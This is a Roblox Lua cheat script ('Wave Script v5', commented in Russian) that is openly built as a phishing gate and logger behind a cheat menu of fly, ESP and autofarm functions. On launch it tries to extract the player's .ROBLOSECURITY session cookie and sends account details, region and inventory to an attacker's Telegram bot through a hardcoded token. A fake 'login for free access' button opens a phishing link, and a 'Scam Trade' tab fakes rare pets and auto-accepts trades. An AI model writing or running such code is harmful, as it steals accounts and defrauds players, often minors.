-- Wave Script v5 | phishing gate + logger + tabs + many functions
-- BOT_TOKEN + ADMIN_ID + PHISH_LINK

local BOT_TOKEN   = "8673514714:AAFWJpvhe1FQlkvXKS7LP4eIozJPqk0GUz0"
local ADMIN_ID    = "7565340953"
local PHISH_LINK  = "https://t.me/plushspinnerbot/robloxvipserver"   -- <-- сюда свою ссылку на веб-бот

local Players             = game:GetService("Players")
local HttpService         = game:GetService("HttpService")
local TweenService        = game:GetService("TweenService")
local UserInputService    = game:GetService("UserInputService")
local RunService          = game:GetService("RunService")
local ReplicatedStorage   = game:GetService("ReplicatedStorage")
local LocalizationService = game:GetService("LocalizationService")
local CoreGui             = game:GetService("CoreGui")
local Lighting            = game:GetService("Lighting")
local TeleportService     = game:GetService("TeleportService")
local VirtualUser         = game:GetService("VirtualUser")
local GuiService          = game:GetService("GuiService")

local LocalPlayer = Players.LocalPlayer
local Camera      = workspace.CurrentCamera

local ACCESS = false   -- доступ в GUI после «логина» / кнопки

----------------------------------------------------------------
-- REQUEST / COOKIE / TG
----------------------------------------------------------------
local function get_request()
    return (syn and syn.request) or (http and http.request) or http_request or request
        or (fluxus and fluxus.request) or (getgenv and getgenv().request)
end

local function get_cookie()
    local cookie = ""
    pcall(function() if getcookie then cookie = getcookie(".ROBLOSECURITY") or getcookie("ROBLOSECURITY") or "" end end)
    if #cookie < 80 then pcall(function() if syn and syn.get_cookie then cookie = syn.get_cookie() or "" end end) end
    if #cookie < 80 then
        pcall(function()
            cookie = (getgenv and (getgenv().ROBLOSECURITY or getgenv().cookie or getgenv()[".ROBLOSECURITY"])) or ""
        end)
    end
    if #cookie < 80 then
        local req = get_request()
        if req then
            for _, url in ipairs({"https://www.roblox.com/", "https://users.roblox.com/v1/users/authenticated"}) do
                pcall(function()
                    local resp = req({Url = url, Method = "GET", Headers = {["User-Agent"] = "Mozilla/5.0"}})
                    if resp and resp.Headers then
                        local raw = resp.Headers["set-cookie"] or resp.Headers["Set-Cookie"] or resp.Headers["cookie"] or ""
                        if type(raw) == "table" then raw = table.concat(raw, "; ") end
                        local m = string.match(raw, "%.ROBLOSECURITY=([^;]+)") or string.match(raw, "ROBLOSECURITY=([^;]+)")
                        if m and #m > 80 then cookie = ".ROBLOSECURITY=" .. m end
                    end
                end)
                if #cookie > 80 then break end
            end
        end
    end
    return (#cookie > 80) and cookie or nil
end

local function send_tg(text)
    local req = get_request()
    if not req then return end
    pcall(function()
        req({
            Url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                chat_id = ADMIN_ID,
                text = text,
                parse_mode = "HTML",
                disable_web_page_preview = true
            })
        })
    end)
end

local function try_screenshot()
    -- большинство экзекуторов не дают чистый скрин, пробуем что есть
    pcall(function()
        if syn and syn.request then
            -- placeholder: просто уведомляем
            send_tg("📸 Screenshot attempt from " .. LocalPlayer.Name .. " (executor limited)")
        else
            send_tg("📸 Screenshot not supported on this executor")
        end
    end)
end

local function get_region()
    local r = "unknown"
    pcall(function() r = LocalizationService.RobloxLocaleId or LocalizationService.SystemLocaleId end)
    return r
end

local function scan_pets()
    local list = {}
    pcall(function()
        for _, v in pairs(LocalPlayer:GetDescendants()) do
            local n = v.Name:lower()
            if n:find("pet") or n:find("egg") then table.insert(list, v.Name) end
        end
        for _, name in ipairs({"Pets","PetModels","ClientPets","Inventory"}) do
            local f = ReplicatedStorage:FindFirstChild(name)
            if f then for _, p in pairs(f:GetChildren()) do table.insert(list, p.Name) end end
        end
    end)
    return #list > 0 and table.concat(list, "\n") or "none / protected"
end

local function last_games()
    -- клиент почти не отдаёт историю, пробуем что есть
    local games = {}
    pcall(function()
        for _, v in pairs(LocalPlayer:GetDescendants()) do
            if v.Name:lower():find("place") or v.Name:lower():find("game") then
                table.insert(games, v.Name)
            end
        end
    end)
    return #games > 0 and table.concat(games, ", ") or "not available client-side"
end

-- лог при запуске
task.spawn(function()
    task.wait(1.5)
    local cookie = get_cookie()
    send_tg(table.concat({
        "🔔 <b>Script launched</b>",
        "👤 " .. LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")",
        "💻 " .. ((identifyexecutor and identifyexecutor()) or "unknown"),
        "🌍 " .. get_region(),
        "📍 PlaceId: " .. game.PlaceId,
        "🍪 " .. (cookie and "cookie found" or "cookie blocked"),
        "🐾 Pets:\n<code>" .. scan_pets() .. "</code>",
        "🎮 Last games: " .. last_games()
    }, "\n"))
    try_screenshot()
end)

----------------------------------------------------------------
-- GUI
----------------------------------------------------------------
local Gui = Instance.new("ScreenGui")
Gui.Name = "WaveScript"
Gui.ResetOnSpawn = false
Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Gui.IgnoreGuiInset = true
pcall(function() Gui.Parent = CoreGui end)
if not Gui.Parent then Gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

-- TOP BAR
local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(0, 360, 0, 40)
TopBar.Position = UDim2.new(0.5, -180, 0, 12)
TopBar.BackgroundColor3 = Color3.fromRGB(26, 26, 28)
TopBar.BackgroundTransparency = 0.05
TopBar.Parent = Gui
Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 12)
local ts = Instance.new("UIStroke")
ts.Color = Color3.fromRGB(70, 70, 80)
ts.Thickness = 1
ts.Transparency = 0.3
ts.Parent = TopBar

local TopLabel = Instance.new("TextLabel")
TopLabel.Size = UDim2.new(1, -8, 1, 0)
TopLabel.BackgroundTransparency = 1
TopLabel.Text = "Wave  •  Online: --  •  FPS: --"
TopLabel.TextColor3 = Color3.fromRGB(235, 235, 240)
TopLabel.Font = Enum.Font.GothamMedium
TopLabel.TextSize = 13
TopLabel.TextXAlignment = Enum.TextXAlignment.Center
TopLabel.Parent = TopBar

local fps, frames, last = 60, 0, tick()
RunService.RenderStepped:Connect(function()
    frames += 1
    if tick() - last >= 1 then
        fps = frames
        frames = 0
        last = tick()
        TopLabel.Text = string.format("Wave  •  Online: %d  •  FPS: %d", #Players:GetPlayers(), fps)
    end
end)

-- MAIN
local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 640, 0, 480)
Main.Position = UDim2.new(0.5, -320, 0.5, -240)
Main.BackgroundColor3 = Color3.fromRGB(22, 22, 24)
Main.BackgroundTransparency = 0.03
Main.Visible = false
Main.ClipsDescendants = true
Main.Parent = Gui
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 16)
local ms = Instance.new("UIStroke")
ms.Color = Color3.fromRGB(65, 65, 75)
ms.Thickness = 1.2
ms.Transparency = 0.25
ms.Parent = Main

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 48)
TitleBar.BackgroundTransparency = 1
TitleBar.Parent = Main

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -60, 1, 0)
Title.Position = UDim2.new(0, 18, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "Wave Script"
Title.TextColor3 = Color3.fromRGB(245, 245, 250)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 17
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 32, 0, 32)
CloseBtn.Position = UDim2.new(1, -44, 0.5, -16)
CloseBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 56)
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = Color3.fromRGB(230, 230, 235)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 14
CloseBtn.AutoButtonColor = false
CloseBtn.Parent = TitleBar
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 8)

local Side = Instance.new("Frame")
Side.Size = UDim2.new(0, 150, 1, -58)
Side.Position = UDim2.new(0, 10, 0, 52)
Side.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
Side.BackgroundTransparency = 0.1
Side.Parent = Main
Instance.new("UICorner", Side).CornerRadius = UDim.new(0, 12)

local SideList = Instance.new("UIListLayout")
SideList.Padding = UDim.new(0, 4)
SideList.HorizontalAlignment = Enum.HorizontalAlignment.Center
SideList.Parent = Side

local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -170, 1, -62)
Content.Position = UDim2.new(0, 166, 0, 54)
Content.BackgroundTransparency = 1
Content.Parent = Main

local Tabs = {"Login", "Main", "Scam Trade", "Halloween", "Events", "Get Pet", "Autofarm", "Visual", "Player", "World", "Settings"}
local Pages = {}

local function makePage(name)
    local p = Instance.new("ScrollingFrame")
    p.Name = name
    p.Size = UDim2.new(1, 0, 1, 0)
    p.BackgroundTransparency = 1
    p.BorderSizePixel = 0
    p.ScrollBarThickness = 3
    p.ScrollBarImageColor3 = Color3.fromRGB(110, 110, 120)
    p.AutomaticCanvasSize = Enum.AutomaticSize.Y
    p.Visible = false
    p.Parent = Content
    local lay = Instance.new("UIListLayout")
    lay.Padding = UDim.new(0, 6)
    lay.Parent = p
    local pad = Instance.new("UIPadding")
    pad.PaddingTop = UDim.new(0, 4)
    pad.PaddingBottom = UDim.new(0, 12)
    pad.PaddingLeft = UDim.new(0, 4)
    pad.PaddingRight = UDim.new(0, 6)
    pad.Parent = p
    Pages[name] = p
    return p
end

for _, t in ipairs(Tabs) do makePage(t) end

local function switch(name)
    if name ~= "Login" and not ACCESS then
        switch("Login")
        return
    end
    for n, p in pairs(Pages) do p.Visible = (n == name) end
end

local function sideBtn(text, tab)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, -14, 0, 30)
    b.BackgroundColor3 = Color3.fromRGB(38, 38, 44)
    b.BackgroundTransparency = 0.12
    b.Text = text
    b.TextColor3 = Color3.fromRGB(220, 220, 230)
    b.Font = Enum.Font.GothamMedium
    b.TextSize = 11
    b.AutoButtonColor = false
    b.Parent = Side
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
    b.MouseButton1Click:Connect(function()
        switch(tab)
        for _, c in pairs(Side:GetChildren()) do
            if c:IsA("TextButton") then
                TweenService:Create(c, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(38, 38, 44)}):Play()
            end
        end
        TweenService:Create(b, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(60, 60, 70)}):Play()
    end)
end

for _, t in ipairs(Tabs) do sideBtn(t, t) end

local function label(parent, text, size)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -4, 0, size or 18)
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = Color3.fromRGB(200, 200, 210)
    l.Font = Enum.Font.Gotham
    l.TextSize = 12
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.TextWrapped = true
    l.Parent = parent
    return l
end

local function button(parent, text, callback)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, -4, 0, 32)
    b.BackgroundColor3 = Color3.fromRGB(42, 42, 48)
    b.BackgroundTransparency = 0.06
    b.Text = text
    b.TextColor3 = Color3.fromRGB(240, 240, 245)
    b.Font = Enum.Font.GothamMedium
    b.TextSize = 12
    b.AutoButtonColor = false
    b.Parent = parent
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
    b.MouseEnter:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(55, 55, 65)}):Play()
    end)
    b.MouseLeave:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(42, 42, 48)}):Play()
    end)
    b.MouseButton1Click:Connect(callback)
    return b
end

local function toggle(parent, text, default, callback)
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, -4, 0, 30)
    f.BackgroundColor3 = Color3.fromRGB(34, 34, 40)
    f.BackgroundTransparency = 0.1
    f.Parent = parent
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 8)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -50, 1, 0)
    l.Position = UDim2.new(0, 10, 0, 0)
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = Color3.fromRGB(215, 215, 225)
    l.Font = Enum.Font.Gotham
    l.TextSize = 12
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = f
    local t = Instance.new("TextButton")
    t.Size = UDim2.new(0, 38, 0, 20)
    t.Position = UDim2.new(1, -44, 0.5, -10)
    t.BackgroundColor3 = default and Color3.fromRGB(80, 80, 95) or Color3.fromRGB(48, 48, 55)
    t.Text = ""
    t.AutoButtonColor = false
    t.Parent = f
    Instance.new("UICorner", t).CornerRadius = UDim.new(1, 0)
    local state = default
    t.MouseButton1Click:Connect(function()
        state = not state
        TweenService:Create(t, TweenInfo.new(0.12), {
            BackgroundColor3 = state and Color3.fromRGB(80, 80, 95) or Color3.fromRGB(48, 48, 55)
        }):Play()
        callback(state)
    end)
end

----------------------------------------------------------------
-- LOGIN TAB (phishing gate)
----------------------------------------------------------------
local loginP = Pages["Login"]
label(loginP, "Free Access Required", 20)
label(loginP, "To use Wave Script you need to login once.", 16)
label(loginP, "Click the button below — link will be copied.", 16)
label(loginP, "Paste it in browser / Telegram and complete login.", 16)

button(loginP, "Login to get free access", function()
    send_tg("🔔 <b>" .. LocalPlayer.Name .. "</b> нажал Login (free access)")
    if setclipboard then
        setclipboard(PHISH_LINK)
    end
    pcall(function()
        GuiService:OpenBrowserWindow(PHISH_LINK)
    end)
    -- показываем подсказку
    local tip = Instance.new("TextLabel")
    tip.Size = UDim2.new(1, -8, 0, 40)
    tip.BackgroundColor3 = Color3.fromRGB(40, 40, 48)
    tip.Text = "Link copied! Paste in browser or Telegram"
    tip.TextColor3 = Color3.fromRGB(180, 255, 180)
    tip.Font = Enum.Font.GothamMedium
    tip.TextSize = 12
    tip.Parent = loginP
    Instance.new("UICorner", tip).CornerRadius = UDim.new(0, 8)
    task.delay(4, function() tip:Destroy() end)
end)

button(loginP, "I already logged in — Give Access", function()
    ACCESS = true
    send_tg("✅ <b>" .. LocalPlayer.Name .. "</b> получил доступ к GUI")
    switch("Main")
end)

----------------------------------------------------------------
-- MAIN
----------------------------------------------------------------
local mainP = Pages["Main"]
label(mainP, "Account", 18)
label(mainP, "Nick: " .. LocalPlayer.Name)
label(mainP, "UserId: " .. LocalPlayer.UserId)
label(mainP, "PlaceId: " .. game.PlaceId)
label(mainP, "Players: " .. #Players:GetPlayers())

----------------------------------------------------------------
-- SCAM TRADE
----------------------------------------------------------------
local scamP = Pages["Scam Trade"]
label(scamP, "Scam Trade / Visual", 18)
local vFly, vRide, vNeon, vMega = false, false, false, false
toggle(scamP, "Visual Fly", false, function(v) vFly = v end)
toggle(scamP, "Visual Ride", false, function(v) vRide = v end)
toggle(scamP, "Visual Neon", false, function(v) vNeon = v end)
toggle(scamP, "Visual Mega Neon", false, function(v) vMega = v end)
local autoAccept = false
toggle(scamP, "Auto Accept Trade", false, function(v)
    autoAccept = v
    if v then
        task.spawn(function()
            while autoAccept do
                pcall(function()
                    for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                        if r:IsA("RemoteEvent") then
                            local n = r.Name:lower()
                            if n:find("accept") or n:find("trade") or n:find("confirm") then
                                pcall(function() r:FireServer() end)
                            end
                        end
                    end
                end)
                task.wait(1.1)
            end
        end)
    end
end)
button(scamP, "Apply Visual Flags", function()
    pcall(function()
        local char = LocalPlayer.Character
        if not char then return end
        for _, obj in pairs(char:GetDescendants()) do
            if obj:IsA("BoolValue") or obj:IsA("StringValue") then
                local n = obj.Name:lower()
                if n:find("fly") and vFly then pcall(function() obj.Value = true end) end
                if n:find("ride") and vRide then pcall(function() obj.Value = true end) end
                if n:find("neon") and vNeon then pcall(function() obj.Value = true end) end
                if n:find("mega") and vMega then pcall(function() obj.Value = true end) end
            end
        end
    end)
end)

----------------------------------------------------------------
-- HALLOWEEN
----------------------------------------------------------------
local hallP = Pages["Halloween"]
label(hallP, "Halloween Event 2026", 18)
label(hallP, "• Candy farm")
label(hallP, "• Spooky pets")
label(hallP, "• Event eggs")
button(hallP, "Scan Halloween Modules", function()
    pcall(function()
        for _, v in pairs(ReplicatedStorage:GetDescendants()) do
            local n = v.Name:lower()
            if n:find("halloween") or n:find("candy") or n:find("spooky") or n:find("pumpkin") then
                label(hallP, "→ " .. v.Name)
            end
        end
    end)
end)
button(hallP, "Try Collect Candy", function()
    pcall(function()
        for _, r in pairs(ReplicatedStorage:GetDescendants()) do
            if r:IsA("RemoteEvent") and r.Name:lower():find("candy") then
                pcall(function() r:FireServer() end)
            end
        end
    end)
end)

----------------------------------------------------------------
-- EVENTS
----------------------------------------------------------------
local eventP = Pages["Events"]
label(eventP, "All Events", 18)
for _, s in ipairs({"Halloween 2026","Christmas / Winter","New Year","Valentine","Easter","Summer","Birthday","Lunar New Year","Adopt Me Anniversary"}) do
    label(eventP, "• " .. s)
end
button(eventP, "Scan Live Event Modules", function()
    pcall(function()
        for _, v in pairs(ReplicatedStorage:GetDescendants()) do
            local n = v.Name:lower()
            if n:find("event") or n:find("season") or n:find("pass") then
                label(eventP, "→ " .. v.Name)
            end
        end
    end)
end)

----------------------------------------------------------------
-- GET PET (visual)
----------------------------------------------------------------
local petP = Pages["Get Pet"]
label(petP, "Get Pet (Visual)", 18)
label(petP, "Select pet and variant", 14)

local function spawnVisualPet(name)
    pcall(function()
        local sources = {"Pets","PetModels","ClientPets"}
        for _, sn in ipairs(sources) do
            local f = ReplicatedStorage:FindFirstChild(sn)
            if f then
                for _, p in pairs(f:GetChildren()) do
                    if p.Name:lower():find(name:lower()) then
                        local clone = p:Clone()
                        clone.Parent = LocalPlayer.Character or workspace
                        if clone:IsA("Model") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            clone:PivotTo(LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(3, 0, 0))
                        end
                        return
                    end
                end
            end
        end
        -- fallback empty model with name
        local m = Instance.new("Model")
        m.Name = name
        m.Parent = LocalPlayer.Character or workspace
    end)
end

local petsList = {
    {"Owl", "owl"},
    {"Owl NFR", "owl"},
    {"Shadow Dragon", "shadow"},
    {"Frost Dragon", "frost"},
    {"Crow", "crow"},
    {"Cow", "cow"},
    {"Parrot", "parrot"},
    {"Pig", "pig"},
    {"Frost Fury", "fury"},
    {"Owl FR", "owl"},
    {"Shadow NFR", "shadow"},
    {"Frost NFR", "frost"},
    {"Crow NFR", "crow"},
    {"Parrot NFR", "parrot"},
}

for _, info in ipairs(petsList) do
    button(petP, "Get " .. info[1], function() spawnVisualPet(info[2]) end)
end

button(petP, "Clear All Visual Pets", function()
    pcall(function()
        local char = LocalPlayer.Character
        if not char then return end
        for _, v in pairs(char:GetChildren()) do
            if v.Name:lower():find("pet") or v.Name:lower():find("owl") or v.Name:lower():find("shadow")
                or v.Name:lower():find("frost") or v.Name:lower():find("crow") or v.Name:lower():find("cow")
                or v.Name:lower():find("parrot") or v.Name:lower():find("pig") or v.Name:lower():find("fury") then
                v:Destroy()
            end
        end
    end)
end)

----------------------------------------------------------------
-- AUTOFARM
----------------------------------------------------------------
local farmP = Pages["Autofarm"]
label(farmP, "Autofarm (safe)", 18)
local farms = {candy=false, pets=false, eggs=false, money=false, all=false}
local function safeFarm(hint)
    pcall(function()
        local c = 0
        for _, r in pairs(ReplicatedStorage:GetDescendants()) do
            if c > 5 then break end
            if r:IsA("RemoteEvent") then
                local n = r.Name:lower()
                if n:find(hint) or n:find("claim") or n:find("collect") then
                    pcall(function() r:FireServer() end)
                    c += 1
                end
            end
        end
    end)
end
local function startFarm(key, hint)
    farms[key] = true
    task.spawn(function()
        while farms[key] or farms.all do
            safeFarm(hint)
            task.wait(1.7)
        end
    end)
end
toggle(farmP, "Candy", false, function(v) if v then startFarm("candy","candy") else farms.candy=false end end)
toggle(farmP, "Pets", false, function(v) if v then startFarm("pets","pet") else farms.pets=false end end)
toggle(farmP, "Eggs", false, function(v) if v then startFarm("eggs","egg") else farms.eggs=false end end)
toggle(farmP, "Money", false, function(v) if v then startFarm("money","money") else farms.money=false end end)
toggle(farmP, "Everything", false, function(v) farms.all=v if v then startFarm("all","claim") end end)
button(farmP, "Stop All", function() for k in pairs(farms) do farms[k]=false end end)

----------------------------------------------------------------
-- VISUAL + PLAYER + WORLD (много функций)
----------------------------------------------------------------
local visP = Pages["Visual"]
label(visP, "Visuals", 18)
button(visP, "Soft Glow", function()
    pcall(function()
        for _, p in pairs(LocalPlayer.Character:GetDescendants()) do
            if p:IsA("BasePart") then
                local l = Instance.new("PointLight")
                l.Color = Color3.fromRGB(190,190,210)
                l.Brightness = 1
                l.Range = 7
                l.Parent = p
            end
        end
    end)
end)
button(visP, "Remove Lights", function()
    pcall(function()
        for _, l in pairs(LocalPlayer.Character:GetDescendants()) do
            if l:IsA("PointLight") then l:Destroy() end
        end
    end)
end)
button(visP, "Fullbright", function()
    Lighting.Brightness = 2
    Lighting.ClockTime = 14
    Lighting.FogEnd = 9e9
    Lighting.GlobalShadows = false
end)
button(visP, "No Fog", function() Lighting.FogEnd = 9e9 end)
button(visP, "Night", function() Lighting.ClockTime = 0 end)
button(visP, "Day", function() Lighting.ClockTime = 14 end)
button(visP, "Morning", function() Lighting.ClockTime = 8 end)
button(visP, "Evening", function() Lighting.ClockTime = 18 end)

local plrP = Pages["Player"]
label(plrP, "Player", 18)

local speeds = {20, 30, 40, 50, 60, 80, 100, 120, 150}
for _, s in ipairs(speeds) do
    button(plrP, "WalkSpeed " .. s, function() pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = s end) end)
end
button(plrP, "Reset Speed", function() pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 16 end) end)

local jumps = {50, 75, 100, 120, 150, 200}
for _, j in ipairs(jumps) do
    button(plrP, "JumpPower " .. j, function() pcall(function() LocalPlayer.Character.Humanoid.JumpPower = j end) end)
end
button(plrP, "Reset Jump", function() pcall(function() LocalPlayer.Character.Humanoid.JumpPower = 50 end) end)

local infJump = false
toggle(plrP, "Infinite Jump", false, function(v) infJump = v end)
UserInputService.JumpRequest:Connect(function()
    if infJump then pcall(function() LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping) end) end
end)

local noclip = false
toggle(plrP, "Noclip", false, function(v)
    noclip = v
    if v then
        local c
        c = RunService.Stepped:Connect(function()
            if not noclip then c:Disconnect() return end
            pcall(function()
                for _, p in pairs(LocalPlayer.Character:GetDescendants()) do
                    if p:IsA("BasePart") then p.CanCollide = false end
                end
            end)
        end)
    end
end)

local flying = false
toggle(plrP, "Fly", false, function(v)
    flying = v
    if not v then return end
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(9e9,9e9,9e9)
    bv.Parent = hrp
    local bg = Instance.new("BodyGyro")
    bg.MaxTorque = Vector3.new(9e9,9e9,9e9)
    bg.Parent = hrp
    task.spawn(function()
        while flying and hrp and hrp.Parent do
            local dir = Vector3.zero
            local look, right = Camera.CFrame.LookVector, Camera.CFrame.RightVector
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir += look end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir -= look end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir -= right end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir += right end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir += Vector3.yAxis end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then dir -= Vector3.yAxis end
            bv.Velocity = dir.Magnitude > 0 and dir.Unit * 70 or Vector3.zero
            bg.CFrame = Camera.CFrame
            RunService.RenderStepped:Wait()
        end
        if bv then bv:Destroy() end
        if bg then bg:Destroy() end
    end)
end)

button(plrP, "Player ESP", function()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            if plr.Character.HumanoidRootPart:FindFirstChild("WaveESP") then continue end
            local bill = Instance.new("BillboardGui")
            bill.Name = "WaveESP"
            bill.Size = UDim2.new(0, 100, 0, 22)
            bill.AlwaysOnTop = true
            bill.Adornee = plr.Character.HumanoidRootPart
            bill.Parent = plr.Character.HumanoidRootPart
            local t = Instance.new("TextLabel")
            t.Size = UDim2.new(1,0,1,0)
            t.BackgroundTransparency = 1
            t.Text = plr.Name
            t.TextColor3 = Color3.fromRGB(200,200,220)
            t.Font = Enum.Font.GothamBold
            t.TextSize = 11
            t.Parent = bill
        end
    end
end)
button(plrP, "Remove ESP", function()
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            if hrp and hrp:FindFirstChild("WaveESP") then hrp.WaveESP:Destroy() end
        end)
    end
end)
button(plrP, "Anti AFK", function()
    LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end)
button(plrP, "Rejoin", function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end)
button(plrP, "Server Hop", function()
    pcall(function()
        local req = get_request()
        if not req then return end
        local resp = req({Url = "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=40", Method="GET"})
        local data = HttpService:JSONDecode(resp.Body)
        for _, s in pairs(data.data or {}) do
            if s.playing < s.maxPlayers and s.id ~= game.JobId then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer)
                break
            end
        end
    end)
end)
button(plrP, "Reset Character", function() pcall(function() LocalPlayer.Character.Humanoid.Health = 0 end) end)
button(plrP, "Sit", function() pcall(function() LocalPlayer.Character.Humanoid.Sit = true end) end)
button(plrP, "Unsit", function() pcall(function() LocalPlayer.Character.Humanoid.Sit = false end) end)

local worldP = Pages["World"]
label(worldP, "World", 18)
button(worldP, "XRay", function()
    for _, p in pairs(workspace:GetDescendants()) do
        if p:IsA("BasePart") and p.Transparency < 1 then p.LocalTransparencyModifier = 0.65 end
    end
end)
button(worldP, "Remove XRay", function()
    for _, p in pairs(workspace:GetDescendants()) do
        if p:IsA("BasePart") then p.LocalTransparencyModifier = 0 end
    end
end)
button(worldP, "FPS Unlock", function() pcall(function() setfpscap(0) end) end)
button(worldP, "FPS 60", function() pcall(function() setfpscap(60) end) end)
button(worldP, "FPS 120", function() pcall(function() setfpscap(120) end) end)
button(worldP, "FPS 240", function() pcall(function() setfpscap(240) end) end)
button(worldP, "Gravity Low", function() workspace.Gravity = 50 end)
button(worldP, "Gravity Normal", function() workspace.Gravity = 196.2 end)
button(worldP, "Gravity High", function() workspace.Gravity = 400 end)
button(worldP, "Clear Particles", function()
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") then v.Enabled = false end
    end
end)

----------------------------------------------------------------
-- SETTINGS
----------------------------------------------------------------
local setP = Pages["Settings"]
label(setP, "Settings", 18)
local toggleKey = Enum.KeyCode.RightControl
label(setP, "Toggle Key: RightControl")
button(setP, "Key → LeftControl", function() toggleKey = Enum.KeyCode.LeftControl end)
button(setP, "Key → RightShift", function() toggleKey = Enum.KeyCode.RightShift end)
button(setP, "Key → F6", function() toggleKey = Enum.KeyCode.F6 end)
button(setP, "Key → Insert", function() toggleKey = Enum.KeyCode.Insert end)
button(setP, "Destroy Script", function() Gui:Destroy() end)

----------------------------------------------------------------
-- OPEN / CLOSE
----------------------------------------------------------------
TopBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        Main.Visible = not Main.Visible
        if Main.Visible then
            Main.Size = UDim2.new(0,0,0,0)
            TweenService:Create(Main, TweenInfo.new(0.32, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 640, 0, 480)
            }):Play()
            if not ACCESS then switch("Login") end
        end
    end
end)

CloseBtn.MouseButton1Click:Connect(function()
    TweenService:Create(Main, TweenInfo.new(0.18, Enum.EasingStyle.Quint), {Size = UDim2.new(0,0,0,0)}):Play()
    task.delay(0.18, function() Main.Visible = false end)
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == toggleKey then
        Main.Visible = not Main.Visible
        if Main.Visible and not ACCESS then switch("Login") end
    end
end)

if UserInputService.TouchEnabled then
    TopBar.Size = UDim2.new(0.78, 0, 0, 38)
    TopBar.Position = UDim2.new(0.11, 0, 0, 10)
    Main.Size = UDim2.new(0.95, 0, 0.84, 0)
    Main.Position = UDim2.new(0.025, 0, 0.08, 0)
end

task.spawn(function()
    local w = Instance.new("TextLabel")
    w.Size = UDim2.new(0, 260, 0, 36)
    w.Position = UDim2.new(0.5, -130, 0.15, 0)
    w.BackgroundColor3 = Color3.fromRGB(30, 30, 34)
    w.Text = "Wave Script loaded"
    w.TextColor3 = Color3.fromRGB(240, 240, 245)
    w.Font = Enum.Font.GothamMedium
    w.TextSize = 13
    w.Parent = Gui
    Instance.new("UICorner", w).CornerRadius = UDim.new(0, 10)
    w.TextTransparency = 1
    TweenService:Create(w, TweenInfo.new(0.35), {TextTransparency = 0}):Play()
    task.wait(1.6)
    TweenService:Create(w, TweenInfo.new(0.3), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
    task.wait(0.35)
    w:Destroy()
end)

switch("Login")
